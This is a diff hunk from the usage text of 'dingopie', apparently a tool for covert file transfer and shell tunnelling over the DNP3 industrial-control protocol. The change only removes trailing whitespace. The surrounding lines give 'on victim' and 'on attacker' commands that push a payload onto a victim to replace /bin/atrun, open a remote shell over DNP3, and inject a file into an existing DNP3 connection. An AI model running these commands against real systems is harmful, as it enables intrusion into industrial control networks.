@@ -245,14 +245,14 @@ an interactive shell ('shell' | 'connect').
     $ dingopie server direct receive --file /bin/atrun --server-port 20001
     # on attacker
     $ dingopie client direct send --file payloads/egg --server-ip 128.3.6.22 --server-port 20001
-  
+
   Tunnel a shell over DNP3:
     # on victim
     $ dingopie server direct shell
     # on attacker
     $ dingopie.exe client direct connect -i 131.43.110.7
     dingopie>
-		
+
   Transfer a file over an existing DNP3 connection:
     # on victim
     $ dingopie server inject send -f /tmp/garbage.dat -k "hack the planet" -i 2.6.0.0 -p 20002 -j 31.33.7.95
